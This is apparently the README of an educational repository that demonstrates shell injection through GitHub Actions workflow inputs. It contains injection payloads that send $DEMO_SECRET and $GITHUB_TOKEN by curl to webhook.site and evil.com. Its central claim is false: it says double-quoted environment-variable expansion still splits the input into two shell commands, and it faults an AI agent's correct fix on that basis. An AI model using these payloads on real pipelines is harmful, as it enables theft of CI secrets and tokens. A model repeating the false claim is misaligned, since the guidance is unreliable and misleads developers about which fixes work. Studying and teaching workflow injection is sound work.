# GitHub Actions Shell Injection Vulnerability Demo

This repository demonstrates a **real and exploitable** GitHub Actions security vulnerability: **Shell Injection via untrusted inputs**.

## ⚠️ WARNING

This repository contains **intentionally vulnerable** code for educational purposes. **DO NOT** use these patterns in production!

---

## What is the Vulnerability?

GitHub Actions allows workflows to be triggered with user-provided inputs (`workflow_dispatch`). When these inputs are used directly in `run:` steps, they can inject arbitrary shell commands—even when using environment variables.

### The Problem

**Both of these patterns are vulnerable:**

```yaml
# Pattern 1: Direct interpolation (obviously vulnerable)
run: git checkout -b "update-${{ inputs.package_name }}"

# Pattern 2: Using env vars (STILL VULNERABLE!)
run: git checkout -b "update-${PACKAGE_NAME}"
env:
  PACKAGE_NAME: ${{ inputs.package_name }}
```

**Why?** Because GitHub Actions evaluates `${{ ... }}` expressions **before** the shell runs, injecting the raw string value. The shell then interprets special characters like `;`, `&`, `|`, `$()`, etc.

---

## Demonstration Workflows

This repository contains three workflows:

### 1. `vulnerable.yml` - Original Vulnerable Pattern
Direct interpolation of untrusted inputs into shell commands.

### 2. `ineffective-fix.yml` - The Attempted "Fix"
Uses environment variables (the recommended "fix" from many SAST tools), but **still vulnerable**.

### 3. `secure.yml` - Proper Security Fix
Validates inputs with regex before using them.

---

## How to Test the Vulnerability

### Step 1: Fork or Clone This Repository

You need a GitHub repository with Actions enabled to test this.

### Step 2: Run the Vulnerable Workflow

1. Go to **Actions** tab
2. Select **"VULNERABLE: Package Update Workflow"**
3. Click **"Run workflow"**
4. Enter these inputs:

#### Test Case 1: Exfiltrate Secret via HTTP Request

**Package name:**
```
foo"; curl -X POST https://webhook.site/YOUR-WEBHOOK-ID -d "secret=$DEMO_SECRET" #
```

**Package version:**
```
1.0.0
```

**What happens:**
1. GitHub Actions evaluates `${{ inputs.package_name }}` to the literal string
2. Shell receives: `git checkout -b "update-foo"; curl -X POST ... #-1.0.0"`
3. The quote closes, semicolon ends the git command
4. The curl command **executes and exfiltrates the secret**
5. The `#` comments out the rest

**Result:** The secret `DEMO_SECRET=super-secret-api-key-12345` is sent to your webhook!

#### Test Case 2: Execute Arbitrary Commands

**Package name:**
```
foo"; echo "pwned" > /tmp/hacked.txt && cat /tmp/hacked.txt #
```

**Package version:**
```
1.0.0
```

**What happens:**
- Creates a file `/tmp/hacked.txt`
- Outputs "pwned" in the workflow logs
- Proves arbitrary command execution

#### Test Case 3: Access GitHub Token

**Package name:**
```
foo"; echo "Token: $GITHUB_TOKEN" #
```

**Package version:**
```
1.0.0
```

**What happens:**
- Logs show the GitHub token (redacted in UI, but attacker could exfiltrate it)
- Could be used to push malicious code, access private repos, etc.

---

## Step 3: Try the "Ineffective Fix"

Run the **"INEFFECTIVE FIX: Using Environment Variables"** workflow with the same malicious inputs.

**Result:** The attack still works! Moving to env vars changes nothing.

---

## Step 4: Try the Secure Workflow

Run the **"SECURE: Proper Input Validation"** workflow with the same malicious inputs.

**Result:** ✅ The workflow fails at the validation step with an error message:

```
❌ ERROR: Invalid package name format
   Package name: foo"; curl -X POST https://webhook.site/...
   Expected format: @scope/package-name or package-name
   Allowed characters: a-z, A-Z, 0-9, _, -, /, @
```

The malicious input is **rejected before any commands execute**.

---

## Visual Explanation

### How the Attack Works

```yaml
# Workflow definition
run: git checkout -b "update-${PACKAGE_NAME}"
env:
  PACKAGE_NAME: ${{ inputs.package_name }}
```

**Step 1: User provides malicious input**
```
package_name: foo"; curl https://evil.com?secret=$DEMO_SECRET #
```

**Step 2: GitHub Actions evaluates the expression**
```yaml
env:
  PACKAGE_NAME: foo"; curl https://evil.com?secret=$DEMO_SECRET #
```

**Step 3: Shell receives this command**
```bash
git checkout -b "update-foo"; curl https://evil.com?secret=$DEMO_SECRET #"
                        └─┬──┘  └──────────────┬─────────────────────┘
                    Closes quote    Malicious command executes!
```

**Step 4: Shell executes two commands**
```bash
Command 1: git checkout -b "update-foo"
Command 2: curl https://evil.com?secret=super-secret-api-key-12345
```

---

## Real-World Impact

This vulnerability allows an attacker to:

1. **Steal secrets** - Access `GITHUB_TOKEN`, AWS keys, API tokens, etc.
2. **Push malicious code** - Use the token to commit backdoors
3. **Access private repositories** - Clone and exfiltrate source code
4. **Compromise CI/CD pipeline** - Poison build artifacts
5. **Lateral movement** - Use stolen credentials to attack other systems

---

## Why Environment Variables Don't Fix This

Many developers (and SAST tools) incorrectly believe that moving to environment variables prevents injection:

**Myth:** "Environment variables are safe because they're not directly in the shell command"

**Reality:** The shell still expands `${PACKAGE_NAME}`, and the **value** of that variable contains the malicious payload. The injection happens during variable expansion, not during expression evaluation.

### The Execution Flow

```
1. GitHub Actions: ${{ inputs.package_name }} → "foo; curl evil.com"
2. Environment:    PACKAGE_NAME="foo; curl evil.com"
3. Shell script:   git checkout -b "update-${PACKAGE_NAME}"
4. Shell expands:  git checkout -b "update-foo; curl evil.com"
5. Shell parses:   TWO COMMANDS (git + curl)
6. Attack succeeds ✗
```

**No escaping happens at any step!**

---

## The Proper Fix: Input Validation

The secure workflow validates inputs using regex:

```yaml
- name: Validate Inputs
  run: |
    # Only allow safe characters in package names
    if ! echo "$PACKAGE_NAME" | grep -qE '^@?[a-zA-Z0-9_-]+(/[a-zA-Z0-9_-]+)?$'; then
      echo "❌ Invalid package name"
      exit 1
    fi

    # Only allow semantic version format
    if ! echo "$PACKAGE_VERSION" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+'; then
      echo "❌ Invalid version"
      exit 1
    fi
  env:
    PACKAGE_NAME: ${{ inputs.package_name }}
    PACKAGE_VERSION: ${{ inputs.package_version }}
```

**Now the attack is blocked:**
```
Input: foo"; curl evil.com
Regex: ^@?[a-zA-Z0-9_-]+(/[a-zA-Z0-9_-]+)?$
Match: NO (contains quotes, semicolon, spaces)
Result: Workflow exits with error before any git/curl commands run
```

---

## Alternative Secure Solutions

### Option 1: Use `actions/github-script` (Best for complex workflows)

```yaml
- uses: actions/github-script@v7
  with:
    script: |
      const { exec } = require('@actions/exec');
      await exec.exec('git', ['checkout', '-b', branchName]);
```

**Why it's secure:** Arguments are passed as an array, not a shell string. No shell = no shell injection.

### Option 2: Use `printf %q` for shell escaping

```yaml
run: |
  SAFE_NAME=$(printf %q "$PACKAGE_NAME")
  git checkout -b "update-${SAFE_NAME}"
env:
  PACKAGE_NAME: ${{ inputs.package_name }}
```

**Why it's secure:** `printf %q` escapes special characters. However, this makes ugly branch names with backslashes.

### Option 3: Restrict workflow triggers

Only allow trusted users (repository maintainers) to trigger the workflow:
- Use branch protection rules
- Require CODEOWNERS approval
- Don't expose `workflow_dispatch` to external contributors

---

## Testing Checklist

Run each test case and verify results:

- [ ] **Test 1:** Vulnerable workflow + malicious input → Secret exfiltrated
- [ ] **Test 2:** Ineffective fix + malicious input → Still vulnerable
- [ ] **Test 3:** Secure workflow + malicious input → Input rejected
- [ ] **Test 4:** Secure workflow + valid input → Workflow succeeds

---

## Setting Up Your Own Test

### 1. Get a Webhook URL

Visit [webhook.site](https://webhook.site/) to get a unique URL for testing HTTP requests.

### 2. Craft Your Payload

Replace `YOUR-WEBHOOK-ID` with your actual webhook:

```
foo"; curl -X POST https://webhook.site/YOUR-WEBHOOK-ID -d "secret=$DEMO_SECRET&token=$GITHUB_TOKEN" #
```

### 3. Run the Workflow

Use this payload in the **Package name** field.

### 4. Check the Webhook

Visit webhook.site and see if your request arrived with the secret!

---

## Why This Matters

This vulnerability was found in the **Prefect** project (a real open-source workflow orchestration tool). The AI remediation agent:
1. ✅ Correctly identified the vulnerability
2. ✅ Correctly understood the attack vector
3. ❌ Applied an ineffective fix (moving to env vars)
4. ❌ Never tested if the fix actually prevented the attack

This demonstrates:
- SAST tools can provide incorrect remediation advice
- "Fixing" without testing is dangerous
- AI agents need adversarial validation

---

## Key Takeaways

### ❌ What DOESN'T Work

- Using environment variables instead of direct interpolation
- Double-quoting variables
- Trusting SAST tool recommendations without verification

### ✅ What DOES Work

- **Input validation with regex** (whitelist approach)
- **Using safe APIs** (github-script with argument arrays)
- **Shell escaping** (printf %q, though creates ugly output)
- **Restricting workflow triggers** (defense in depth)

---

## References

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [GitHub Security Lab: Actions Command Injection](https://securitylab.github.com/research/github-actions-untrusted-input/)

---

## License

MIT - Use this for educational purposes. Do not use vulnerable patterns in production!

---

## Questions?

This vulnerability is **real** and **exploitable**. If you're still skeptical, run the test cases above and see the secrets get exfiltrated!

For more details, see the [trajectory analysis document](https://github.com/your-username/github-actions-injection-demo/blob/main/ANALYSIS.md).
